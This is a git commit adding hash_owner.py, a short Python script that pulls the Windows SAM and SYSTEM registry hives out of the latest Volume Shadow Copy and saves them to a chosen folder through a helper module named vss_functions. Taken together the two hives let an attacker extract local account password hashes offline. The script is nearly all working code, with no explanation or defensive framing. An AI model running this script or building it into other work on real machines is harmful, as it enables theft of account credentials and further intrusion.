e3c2349cd637d0ee77dbb9a2bd17a621e5a1f1e9
Shcherbakov Alexey <lovelessxt@gmail.com>
2016-11-20 19:59:55 +0300

    initial commit

---
+++ hash_owner.py
@@ -0,0 +1,33 @@
+# -*- coding:utf-8 -*-
+import argparse
+import vss_functions
+
+
+def argument_parsing():
+    parser = argparse.ArgumentParser(description=u'Great Description To Be Here')
+
+    parser.add_argument(action='store',
+                        type=str,
+                        dest='output_path',
+                        help='Specify output path')
+
+    return parser.parse_args()
+
+
+if __name__ == '__main__':
+
+    args = argument_parsing()
+    sam_path = r'C:\Windows\System32\config\SAM'
+    system_path = r'C:\Windows\System32\config\SYSTEM'
+
+    vss_functions.copy_shadow_as_file(
+        shadow_path=vss_functions.get_last_shadow_path(
+            vss_functions.get_shadow_paths(sam_path)),
+        output='{}\{}'.format(args.output_path, 'sam')
+    )
+    vss_functions.copy_shadow_as_file(
+        shadow_path=vss_functions.get_last_shadow_path(
+            vss_functions.get_shadow_paths(system_path)),
+        output='{}\{}'.format(args.output_path, 'system')
+    )
+    print('Success!')
